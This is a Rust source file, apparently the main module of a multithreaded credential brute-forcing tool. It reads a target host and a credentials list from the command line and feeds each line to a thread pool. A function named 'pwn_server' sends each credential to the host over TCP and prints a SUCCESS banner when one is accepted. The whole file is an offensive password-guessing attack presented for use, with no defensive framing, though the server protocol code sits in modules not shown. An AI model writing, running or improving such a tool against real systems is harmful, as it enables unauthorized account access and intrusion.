mod server;
mod manage_threads;
mod channels;

use std::io::prelude::*;

use clap::Parser;
pub use server::Server;
pub use manage_threads::HandleThreads;
pub use manage_threads::ManageThreads;
pub use server::Connect_To_Server;
pub use channels::{channel, Receiver, Sender};

use std::fs::File;
use std::io::BufReader;
use std::thread;
use std::{
    io::{ Result},
    path::Path,
    time::Instant,
};
use threadpool::ThreadPool;

#[derive(Parser, Debug)]
struct Raw_Args {
    #[clap(short, long)]
    host: String,
    #[clap(short, long)]
    credentials: String,
}

#[derive(Parser, Debug)]
struct RawArgs {
    #[clap(short, long)]
    host: String,
    #[clap(short, long)]
    credentials: String,
}

fn line_producer(file_name: &str,sender: &mut Sender<String>)->  std::io::Result<()> {
    let file_exists = Path::new(&file_name).is_file();
    if !file_exists {
        panic!("{}", format!("File {} does not exist!", file_name))
    }
    let f = File::open(&file_name)?;
    let reader = BufReader::new(f);
    let mut line_iter = reader.lines().map(|l| l.unwrap());
    loop {
        match line_iter.next() {
            Some(line) => {
                sender.send(line);
            },
            None => { break }
        }
    }
    Ok(())

}



fn main() -> Result<()> {
    // get the cradential list from the arguments
    let args1 = RawArgs::parse();

    let host = args1.host;
    let (mut sender, mut receiver): (Sender<String>, Receiver<String>) = channel();
    let (mut counter_sender, mut counter_receiver): (Sender<u32>, Receiver<u32>) = channel();

    thread::spawn(move || line_producer(&args1.credentials,&mut sender));

    let now = Instant::now();
    let pool = ThreadPool::new(4);
    let manage_threads = HandleThreads::new();
    
    for line in receiver {
        let host = host.clone();
        let mut counter_sender = counter_sender.clone();
        let manage_threads_clone = manage_threads.clone();
        pool.execute(move || pwn_server(&manage_threads_clone,host,&mut counter_sender,line));
    }

    manage_threads.start_work();

    println!("Total attempts {}", counter_receiver.count_queue());
    println!("Total time elapsed: {}", now.elapsed().as_secs());
    Ok(())
}





fn pwn_server(manage_threads:&HandleThreads,host: String,sender: &mut Sender<u32>,cred_chunk: String) -> () {
    let server = Server{host:&host};
    let mut stream = server.connect_tcp();
    if server.can_connect(&mut stream) {
            match server.send(cred_chunk.as_str(), &mut stream, sender) {
                Ok(code) => { 
                    if code == 1 {
                        println!("------------- SUCCESS -------------");
                        println!("{}", cred_chunk);
                        println!("------------- SUCCESS -------------");
                        manage_threads.finish_work();
                    }
                }
                Err(err) => {
                    println!("{:}", err)
                }
            }
        // }
    } else {
        println!(
            "It appears that is not ready for new connections"
        );
    }
} 